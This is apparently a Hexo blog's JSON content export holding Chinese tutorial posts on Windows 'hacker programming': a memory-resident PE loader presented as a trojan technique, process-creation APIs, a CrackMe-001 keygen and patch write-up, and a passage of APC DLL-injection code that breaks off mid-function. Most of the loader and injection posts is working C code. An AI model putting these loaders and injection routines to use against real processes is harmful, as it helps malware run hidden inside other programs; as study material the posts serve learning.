{"meta":{"title":"b1ackie'blog","subtitle":"","description":"","author":"b1ackie","url":"https://b1ack1e.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2021-07-07T04:21:57.734Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"/404.html","permalink":"https://b1ack1e.github.io/404.html","excerpt":"","text":""},{"title":"关于","date":"2021-07-09T10:36:49.838Z","updated":"2021-07-09T10:36:49.838Z","comments":false,"path":"about/index.html","permalink":"https://b1ack1e.github.io/about/index.html","excerpt":"","text":"b1ackie from satter"},{"title":"书单","date":"2021-07-07T04:21:57.735Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"books/index.html","permalink":"https://b1ack1e.github.io/books/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-07-09T10:38:27.093Z","updated":"2021-05-31T02:54:50.000Z","comments":true,"path":"links/index.html","permalink":"https://b1ack1e.github.io/links/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-07-09T10:38:18.156Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"categories/index.html","permalink":"https://b1ack1e.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2021-07-08T05:35:10.751Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"repository/index.html","permalink":"https://b1ack1e.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-07-07T04:21:57.735Z","updated":"2021-05-31T02:54:50.000Z","comments":false,"path":"tags/index.html","permalink":"https://b1ack1e.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"内存直接加载运行","slug":"内存直接加载运行","date":"2021-07-15T06:28:21.000Z","updated":"2021-07-19T04:16:06.716Z","comments":true,"path":"2021/07/15/内存直接加载运行/","link":"","permalink":"https://b1ack1e.github.io/2021/07/15/%E5%86%85%E5%AD%98%E7%9B%B4%E6%8E%A5%E5%8A%A0%E8%BD%BD%E8%BF%90%E8%A1%8C/","excerpt":"","text":"内存直接加载运行内存直接加载运行就是，模拟PE加载器的功能，把DLL或者exe等PE文件从内存中直接加载到病毒木马的内存中去运行，不需要通过loadlibrary等现成的API函数去操作。 实现原理构造一个PE装载器，将PE文件加载到内存中。大致过程，首先要申请一块内存，然后将PE文件按照映像对齐大小映射到内存中；根据重定位表，重定位硬编码数据；获取导入表中的函数及其地址；如果是DLL，获取导出表的相关数据（EXE一般没有导出表）；获取入口点的地址，若为EXE，直接跳到入口点即可执行，DLL文件的话还需要构造一个DLLMAIN函数，实现DLL加载。 具体实现打开文件并且获取大小 12345678910111213char* FileName = &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestDll.dll&quot;;//打开文件HANDLE hFile = CreateFileA(FileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_ARCHIVE, NULL);//获取大小DWORD dwFileSize = GetFileSize(hFile, NULL);//申请内存空间PBYTE pData = new BYTE[dwFileSize];DWORD dwRet = 0;//将文件读取到内存中ReadFile(hFile, pData, dwFileSize, &amp;dwRet, NULL);CloseHandle(hFile); 获取sizeofimage12345678910/*获取PE文件的镜像大小，获取加载到内存后的大小* lpData内存中的基址*/DWORD GetImageSize(LPVOID lpData) &#123; DWORD dwSizeOfImage = 0; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpData; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); dwSizeOfImage = pNtHeaders-&gt;OptionalHeader.SizeOfImage; return dwSizeOfImage;&#125; 根据获取的sizeofimage，在进程中开辟一个内存块，权限可读可写可执行。 12LPVOID lpBaseAddr = VirtualAlloc(NULL, dwImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);RtlZeroMemory(lpBaseAddr, dwImageSize); 重定位数据12345678910111213141516171819202122232425262728293031323334/*获取重定位表的相关数据并且重定位数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoRelocationTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取重定位表 PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((unsigned long)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress); if ((PVOID)pReloc == (PVOID)pDosHeader) &#123; return TRUE; &#125; //开始扫描重定位表 while ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != 0) &#123; //重定位表的头部加上sizeof(IMAGE_BASE_RELOCATION)就是重定位数据的开始 WORD* pRelocData = (WORD*)((PBYTE)pReloc + sizeof(IMAGE_BASE_RELOCATION)); //获取需要重定位的数据的个数 int nNumberOfReloc = (pReloc-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); for (int i = 0; i &lt; nNumberOfReloc; i++) &#123; //高位是否为3，判断是否需要修复 if ((DWORD)(pRelocData[i] &amp; 0x0000F000) == 0x00003000) &#123; //获取需要重定位数据的地址 DWORD* pAddress = (DWORD*)((PBYTE)pDosHeader + pReloc-&gt;VirtualAddress + (pRelocData[i] &amp; 0x0FFF)); //修改重定位数据，公式：地址-旧基址+新基址，地址是pAddress中的值 DWORD dwDelta = (DWORD)pDosHeader - pNtHeaders-&gt;OptionalHeader.ImageBase; *pAddress += dwDelta; &#125; &#125; //继续处理下一组重定位数据 pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock); &#125; return TRUE;&#125; 导入表1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/*获取导入表的相关数据* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址*/BOOL DoImportTable(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导入表地址 PIMAGE_IMPORT_DESCRIPTOR pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress); // 循环遍历导入表中的DLL及获取导入表中的函数地址 char* lpDllName = NULL; HMODULE hDll = NULL; PIMAGE_THUNK_DATA lpImportNameArray = NULL; PIMAGE_IMPORT_BY_NAME lpImportByName = NULL; PIMAGE_THUNK_DATA lpImportFuncAddrArray = NULL; FARPROC lpFuncAddress = NULL; DWORD i = 0; while (TRUE) &#123; if (0 == pImportTable-&gt;OriginalFirstThunk) &#123; break; &#125; // 获取导入表中DLL的名称并加载DLL lpDllName = (char*)((DWORD)pDosHeader + pImportTable-&gt;Name); hDll = GetModuleHandleA(lpDllName); if (NULL == hDll) &#123; hDll = LoadLibraryA(lpDllName); if (NULL == hDll) &#123; pImportTable++; continue; &#125; &#125; i = 0; // 获取OriginalFirstThunk以及对应的导入函数名称表首地址 lpImportNameArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;OriginalFirstThunk); // 获取FirstThunk以及对应的导入函数地址表首地址 lpImportFuncAddrArray = (PIMAGE_THUNK_DATA)((DWORD)pDosHeader + pImportTable-&gt;FirstThunk); while (TRUE) &#123; if (0 == lpImportNameArray[i].u1.AddressOfData) &#123; break; &#125; // 获取IMAGE_IMPORT_BY_NAME结构 lpImportByName = (PIMAGE_IMPORT_BY_NAME)((DWORD)pDosHeader + lpImportNameArray[i].u1.AddressOfData); // 判断导出函数是序号导出还是函数名称导出 if (0x80000000 &amp; lpImportNameArray[i].u1.Ordinal) &#123; // 序号导出 // 当IMAGE_THUNK_DATA值的最高位为1时，表示函数以序号方式输入，这时，低位被看做是一个函数序号 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)(lpImportNameArray[i].u1.Ordinal &amp; 0x0000FFFF)); &#125; else &#123; // 名称导出 lpFuncAddress = GetProcAddress(hDll, (LPCSTR)lpImportByName-&gt;Name); &#125; lpImportFuncAddrArray[i].u1.Function = (DWORD)lpFuncAddress; i++; &#125; pImportTable++; &#125; return TRUE;&#125; 修改ImageBase1234567//修改ImageBaseBOOL SetImage(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); pNtHeaders-&gt;OptionalHeader.SizeOfImage = (ULONG32)lpBaseAddr; return TRUE;&#125; 获取入口点如果是EXE，这一步，获取addressOfEntryPoint之后跳到入口点即可直接执行。 123456789BOOL Entry(LPVOID lpBaseAddr) &#123; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); LPVOID Entry = (LPVOID)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); __asm &#123; mov eax,Entry jmp eax &#125;&#125; 现在来测试一下直接运行一个EXE，测试文件为桌面上的TestProcess.exe。源代码如下： 12345#include &lt;stdio.h&gt;int main()&#123; printf(&quot;b1ackie!!!\\n&quot;); return 0;&#125; 运行程序查看效果，可以看到直接加载运行TestProcess.exe。 若是DLL文件，还需要构造一下DLLMAIN 123456789101112BOOL CallDllMain(LPVOID lpBaseAddr) &#123; typedef_DllMain DllMain = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); DllMain = (typedef_DllMain)((ULONG32)pDosHeader + pNtHeaders-&gt;OptionalHeader.AddressOfEntryPoint); BOOL bRet = DllMain((HINSTANCE)lpBaseAddr,DLL_PROCESS_ATTACH,NULL); if (bRet == NULL) &#123; printf(&quot;构造入口点失败\\n&quot;); return bRet; &#125; return bRet;&#125; 导出表123456789101112131415161718192021222324252627282930313233343536/*获取导出函数及其地址* lpBaseAddr: 内存PE数据按SectionAlignment大小对齐映射到进程内存中的内存基址* lpszFuncName：导出函数名字*/LPVOID GetExFuncAddr(LPVOID lpBaseAddr,char* lpszFuncName) &#123; LPVOID lpFunc = NULL; PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpBaseAddr; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG32)pDosHeader + pDosHeader-&gt;e_lfanew); //获取导出表地址 PIMAGE_EXPORT_DIRECTORY pExportTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)pDosHeader + pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); //从导出表取出的函数名 char* lpFuncName = NULL; //获取AddressOfNames PDWORD lpAddressOfNamesArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNames); //获取AddressOfNameOrdinals PWORD lpAddressOfNameOrdinalArray = (PWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfNameOrdinals); //索引值 WORD wHint = 0; //获取AddressOfFunctions PDWORD lpAddressOfFuncArray = (PDWORD)((DWORD)pDosHeader + pExportTable-&gt;AddressOfFunctions); //获取所有根据名称导出的函数数量 DWORD dwNumberOfNames = pExportTable-&gt;NumberOfNames; for (int i = 0; i &lt; dwNumberOfNames; i++) &#123; lpFuncName = (PCHAR)((DWORD)pDosHeader + lpAddressOfNamesArray[i]); if (strcmpi(lpFuncName, lpszFuncName) == 0) &#123; //获取索引值 wHint = lpAddressOfNameOrdinalArray[i]; //根据索引值，在AddressOfFunctions中取出RVA lpFunc = (LPVOID)((DWORD)pDosHeader + lpAddressOfFuncArray[wHint]); break; &#125; &#125; //返回函数地址 return lpFunc;&#125; 运行加载桌面上的TestDll.dll文件，此DLL导出函数是一个messagebox函数。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ack1e.github.io/tags/PE/"}]},{"title":"创建进程API","slug":"创建进程API","date":"2021-07-14T07:15:24.000Z","updated":"2021-07-14T10:51:23.584Z","comments":true,"path":"2021/07/14/创建进程API/","link":"","permalink":"https://b1ack1e.github.io/2021/07/14/%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8BAPI/","excerpt":"","text":"创建进程API在一个进程中创建并启动一个新的进程，对于病毒木马程序和普通的程序来说，都是常见的技术。在用户层上微软提供WinExec，ShellExecute和CreateProcess等函数来实现进程创建。 具体实现及函数介绍WinExec运行指定的应用程序 1234UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow); lpCmdLine：要执行的应用程序的命令行。如果参数中的可执行文件名称不包含文件路径，则系统按以下顺序搜索可执行文件： 应用程序加载的目录 当前目录 Windows系统目录。GetSystemDirectory函数检索此目录的路径。 Windows目录。GetWindowsDirectory函数检索此目录的路径。 PATH环节变量中列出的目录 uCmdShow：显示选项，具体内容如下表： 值 含义 SW_HIDE0 隐藏窗口并激活另一个窗口 SW_SHOWNORMALSW_NORMAL1 激活并显示一个窗口 SW_SHOWMINIMIZED2 激活窗口并将其显示为最小化的窗口 SW_SHOWMAXIMIZEDSW_MAXIMIZE3 激活窗口并将其显示为最大化窗口 SW_SHOWNOACTIVATE4 以最近的大小和位置显示窗口 SW_SHOW5 激活窗口并以其当前大小和位置显示它 SW_MINIMIZE6 最小化指定的窗口并激活Z顺序中的下一个顶级窗口 SW_SHOWMINNOACTIVE7 将窗口显示为最小化窗口 SW_SHOWNA8 以当前大小和位置显示窗口 SW_RESTORE9 激活并显示窗口 SW_SHOWDEFAULT10 根据启动应用程序的程序传递给CreateProcess函数的STARTUPINFO结构中指定的SW_值设置显示状态。 SW_FORCEMINIMIZE11 最小化一个窗口，即使拥有该窗口的线程没有响应。仅在最小化来自不同线程的窗口时才应使用此标志。 返回值：如果函数成功，则返回值大于31；如果函数失败，则返回值是以下错误值之一。 值 含义 0 系统内存或资源不足 ERROR_BAD_FORMAT exe文件无效 ERROR_FILE_NOT_FOUND 找不到指定文件 ERROR_PATH_NOT_FOUND 找不到指定的路径 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestApc.exe&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 创建的进程为之前编写过得MFC程序，运行此程序即可提示创建成功，同时TestAPC也被成功创建。 ShellExecute函数对指定文件执行操作 12345678HINSTANCE ShellExecuteA( HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd); hwnd：用于显示UI或者错误信息的父窗口的句柄。如果操作与窗口无关，则此值可以为NULL。 lpOperation：指向以空字符结尾的字符串的指针，它在本例中成为动词，用于指定要执行的操作。常使用的动词有： edit：启动编辑器并打开文档进行编辑。如果lpFile不是文档文件，则该函数将失败。 explore：探索由lpFile指定的文件夹。 find：在由lpDirectory指定的目录中启动搜索。 open：打开由lpFile指定的项目。该项目可以是文件也可以是文件夹。 print：打印由lpFile指定的文件。如果lpFile不是文档文件，则该函数失败。 NULL：如果可用，则使用默认动词。如果不可用，则使用“打开”动词。如果两个动词都不可用，则系统使用注册表中列出的第一个动词。 lpFile：指向以空字符结尾的字符串的指针，该字符串要在其上指向指定谓词的文件或对象。如果lpDirectory参数使用相对路径，则lpFile不要使用相对路径。 lpParameters：如果lpFile指定一个可执行文件，则此参数是一个指向空字符结尾的字符串的指针，该字符串指定要传递给应用程序的参数。如果lpFile指定一个文档文件，则lpParameters应该为NULL。 lpDirectory：指向以空终止的字符串的指针，该字符串指定操作的默认目录。如果此值为NULL，则使用当前的工作目录。如果在lpFile提供了相对路径，请不要对lpDirectory使用相对路径。 nShowCmd：指定应用程序在打开时如何显示标志，具体值在上文。 返回值：如果函数成功，则返回大于32的值。如果函数失败，则它返回一个错误值，指示失败的原因。 具体代码如下： 123456HINSTANCE hInstance = ShellExecute(NULL, NULL, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestApc.exe&quot;, NULL, NULL, SW_NORMAL);if ((int)hInstance &lt;= 32) &#123; printf(&quot;ShellExecute创建失败\\n&quot;);&#125;else printf(&quot;ShellExecute创建成功\\n&quot;); 运行程序提示创建成功，同时TestAPC被成功创建。 CreateProcess创建一个新进程及主线程。新进程在调用进程的安全的上下文中运行。 123456789101112BOOL CreateProcess( LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation); lpApplicationName：要执行的模块的名称。可以设置为NULL。要运行批处理文件，必须启动命令解释程序，并将其设置为cmd.exe。 lpCommandLine：要执行的命令行。 lpProcessAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新进程对象的句柄是否可以被子进程继承。如果lpProcessAttributes为NULL，则不能继承句柄。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该 结构确定返回的新线程对象句柄是否可由子进程继承。如果lpThreadAttributes为 NULL，则不能继承句柄。 bInheritHandles：如果此参数为 TRUE，则调用进程中的每个可继承句柄都由新进程继承。如果参数为 FALSE，则不继承句柄。 dwCreationFlags：控制优先级类和进程创建的标志。 lpEnvironment：指向新进程的环境块的指针。如果此参数为NULL，则新进程使用调用进程的环境。 lpCurrentDirectory：进程当前目录的完整路径。该字符串还可以指定 UNC 路径。如果此参数为NULL，则新进程将与调用进程具有相同的当前驱动器和目录。 lpStartupInfo：指向STARTUPINFO或STARTUPINFOEX结构的指针 。STARTUPINFO或STARTUPINFOEX中的句柄在不需要时必须由CloseHandle关闭。 lpProcessInformation：指向PROCESS_INFORMATION结构的指针，该结构接收有关新进程的标识信息。PROCESS_INFORMATION中的句柄必须在不需要时由CloseHandle关闭。 返回值：如果函数成功，则返回值非0；若失败，则返回值为0。 具体代码如下： 12345678910111213STARTUPINFO si = &#123; 0 &#125;;PROCESS_INFORMATION pi;si.cb = sizeof(si);si.dwFlags = STARTF_USESHOWWINDOW;si.wShowWindow = SW_NORMAL;BOOL flag = CreateProcess(NULL, &quot;C:\\\\Users\\\\Tophanter\\\\Desktop\\\\TestApc.exe&quot;, NULL, NULL, FALSE, 0, NULL, NULL, &amp;si, &amp;pi);if (flag) &#123; CloseHandle(pi.hThread); CloseHandle(pi.hProcess); printf(&quot;CreateProcess创建成功\\n&quot;);&#125;else printf(&quot;CreateProcess创建失败\\n&quot;); 运行之后，即可成功创建TestAPC进程。","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"}]},{"title":"160CrackMe--001","slug":"160CrackMe-001","date":"2021-07-14T02:23:13.000Z","updated":"2021-07-14T06:50:17.951Z","comments":true,"path":"2021/07/14/160CrackMe-001/","link":"","permalink":"https://b1ack1e.github.io/2021/07/14/160CrackMe-001/","excerpt":"","text":"初探打开程序会弹出如下的窗口，根据标题可以看出，我们需要“杀死”这个弹窗。 程序主题界面有两部分，第一部分是序列号加名字。 第二部分是单纯的序列号，应该是比较简单。 看完大体流程，开始分析。 分析查询程序的基本信息，可以看到未加壳，是用Delphi语言编写的。 先分析单纯的序列号。用OD打开程序，搜索字符串，搜索错误的提示，可以看到成功与错误的提示，还有一个JNZ，这里应该是关键的判断跳转。 在函数头部下断点，开始分析。可以看到它把Hello和Dude！压入栈之后，再将其拼接起来组成新的字符串，然后再与我们输入的序列号进行比较。 那么这里的序列号就是Hello Dude!。输入正确的序列号之后，弹出正确的窗口。 再来分析序列号加用户名还是通过搜索错误提示的字符串，即可找到关键的跳转，在最后的跳转前查看一下，可以看到栈存放着两个值进行比较，一个是我们输入的123456，另一个是CW-80360-CRACKED，那么这个应该是要输入的serial。往上开始寻找这段序列号是如何生成的。在函数头部下断开始分析。 首先是检测了输入的用户名长度，不可以小于4位。 继续往下看，可以看到CW，-，CRACKED和数字这几段，然后通过一个函数将它们拼接起来，字母都是本身有的，那么就需要寻找数字的生成。 数字是通过sub_406718生成的，而其中的参数是通过0x431750处传入的，那么这个值是从哪来的，从上分析。可以看到这里的计算过程。它是获取输入用户名第一位然后乘以0x29再乘以2。而之后的sub_406718作用是将十六进制转为十进制字符串。 到这里整个过程就分析了，开始尝试编写注册机 注册机编写12345678910111213141516171819#include &quot;pch.h&quot;#include &lt; stdio.h &gt;#include &lt;string.h&gt;#include &lt;corecrt_malloc.h&gt;int main()&#123; char Name[20]; printf(&quot;请输入大于四位的用户名\\n&quot;); gets_s(Name, 20); int Num; Num = (Name[0] * 0x29) * 2; char* s1=&quot;CW&quot;; char* s2 = &quot;CRACKED&quot;; char* s3= &quot;-&quot;; char* serial = (char*)malloc(100); sprintf(serial, &quot;%s%s%d%s%s&quot;, s1, s3, Num, s3, s2); printf(&quot;用户名是：%s\\nserial是：%s&quot;, Name, serial); return 0;&#125; 输入用户名b1ackie，就可以计算出正确的serial。 输入正确的值查看 弹窗的消除先根据弹窗的提示信息，搜索字符串，可以定位到此处。 执行出来，可以看到在外部有一个JZ跳转可以跳过这个弹窗函数，我们只需要将其修改为JMP就可以无条件跳走了。 小结第一个crackme，还是比较简单的，没有什么难度，做起来比较轻松。 还记得上次做这个还是大一的时候，那个时候也刚接触这块没多久，当时还是看着帖子一步一步学着来。学习记录还是要坚持做下去，这些crackme也要坚持争取全部都做一遍。","categories":[{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"}]},{"title":"APC注入","slug":"APC注入","date":"2021-07-13T07:25:36.000Z","updated":"2021-07-14T02:18:04.803Z","comments":true,"path":"2021/07/13/APC注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/13/APC%E6%B3%A8%E5%85%A5/","excerpt":"","text":"APC注入APC为异步过程调用，是指函数在特定线程中被异步执行。每一个线程都有自己的APC队列，使用QueueUserAPC函数可以把一个APC函数压入APC队列中，插入LoadLibrary就可以执行DLL。该线程并不会直接调用APC函数，除非该线程处于一个可通知的状态。 函数介绍QueueUserAPC将用户模式中的异步过程调用（APC）对象添加到指定线程的APC队列中。 12345DWORD QueueUserAPC( PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData); pfnAPC：当指定线程执行可警告的等待操作时，指向应用程序提供的APC函数的指针。 hThread：线程的句柄。该句柄必须具有THREAD_SET_CONTEXT访问权限。 dwData：传递由pfnAPC参数指向的APC函数的单个值。 返回值：如果函数成功，则返回值为非0；如果失败，则返回值为0。 具体实现在Windows系统中，每个线程都会维护一个线程APC队列，通过QueueUserAPC把一个APC函数添加到指定线程的APC队列中。每个线程都有自己的APC队列，这个APC队列记录了要求线程执行的一些APC函数。Windows系统会发出一个软中断去执行这些APC函数，对于用户模式下的APC队列，当线程处在可警告状态时才会执行这些APC函数。一个线程在内部使用SingalObjectAndWait、SleepEx、WaitForSingleObjectEx等函数把自己挂起时就是进入警告状态，此时便会执行APC队列函数。 具体代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167// APCInject.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;#include &lt;atlconv.h&gt;#include &lt;atlstr.h&gt;DWORD GetPidByName(char* pszProcessName) &#123; HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 PE32 = &#123; sizeof(PE32) &#125;; USES_CONVERSION; CString ProcessName = A2T(pszProcessName); BOOL flag = Process32First(hSnap, &amp;PE32); while (flag) &#123; if (lstrcmp(PE32.szExeFile, ProcessName) == 0) &#123; return PE32.th32ProcessID; &#125; flag = Process32Next(hSnap, &amp;PE32); &#125; return 0;&#125;BOOL GetAllThreadIdByProcessId(DWORD dwProcessId, DWORD** ppThreadId, DWORD* pdwThreadIdLength)&#123; DWORD* pThreadId = NULL; DWORD dwThreadIdLength = 0; DWORD dwBufferLength = 1000; THREADENTRY32 te32 = &#123; 0 &#125;; HANDLE hSnapshot = NULL; BOOL bRet = TRUE; do &#123; // 申请内存 pThreadId = new DWORD[dwBufferLength]; if (NULL == pThreadId) &#123; printf(&quot;申请内存失败\\n&quot;); bRet = FALSE; break; &#125; RtlZeroMemory(pThreadId, (dwBufferLength * sizeof(DWORD))); // 获取线程快照 RtlZeroMemory(&amp;te32, sizeof(te32)); te32.dwSize = sizeof(te32); hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); if (NULL == hSnapshot) &#123; bRet = FALSE; break; &#125; // 获取第一条线程快照信息 bRet = Thread32First(hSnapshot, &amp;te32); while (bRet) &#123; // 获取进程对应的线程ID if (te32.th32OwnerProcessID == dwProcessId) &#123; pThreadId[dwThreadIdLength] = te32.th32ThreadID; dwThreadIdLength++; &#125; // 遍历下一个线程快照信息 bRet = Thread32Next(hSnapshot, &amp;te32); &#125; // 返回 *ppThreadId = pThreadId; *pdwThreadIdLength = dwThreadIdLength; bRet = TRUE; &#125; while (FALSE); if (FALSE == bRet) &#123; if (pThreadId) &#123; delete[]pThreadId; pThreadId = NULL; &#125; &#125; return bRet;&#125;BOOL Inject(char* pszProcessName, char* pszDllname) &#123; BOOL flag = FALSE; DWORD dwPID = 0; DWORD* pThreadId = NULL; DWORD dwThreadLength = 0; HANDLE hProcess = NULL; HANDLE hThread = NULL; PVOID pBaseAddress = NULL; PVOID pLoadLibraryFunc = NULL; SIZE_T dwRet = 0, dwDllPathLen = strlen(pszDllname) + 1; DWORD i = 0; do &#123; //获取进程的PID dwPID = GetPidByName(pszProcessName); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); flag = FALSE; break; &#125; //获取所有线程ID flag = GetAllThreadIdByProcessId(dwPID, &amp;pThreadId, &amp;dwThreadLength); if (flag == FALSE) &#123; flag = FALSE; break; &#125; //打开进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); flag = FALSE; break; &#125; //申请内存空间 pBaseAddress = VirtualAllocEx(hProcess, NULL, dwDllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (pBaseAddress == NULL) &#123; printf(&quot;申请空间失败\\n&quot;); flag = FALSE; break; &#125; //向申请的空间写入内存 WriteProcessMemory(hProcess, pBaseAddress, pszDllname, dwDllPathLen, &amp;dwRet); if (dwRet != dwDllPathLen) &#123; printf(&quot;写入内存失败\\n&quot;); flag = FALSE; break; &#125; pLoadLibraryFunc = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;); if (pLoadLibraryFunc == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); flag = FALSE; break; &#125; //向所有的线程插入APC函数 for (i = 0; i &lt; dwThreadLength; i++) &#123; hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, pThreadId[i]); if (hThread) &#123; QueueUserAPC((PAPCFUNC)pLoadLibraryFunc, hThread, (ULONG_PTR)pBaseAddress); CloseHandle(hThread); hThread = NULL; &#125; &#125; flag = TRUE; &#125; while (FALSE); if (hProcess) &#123; 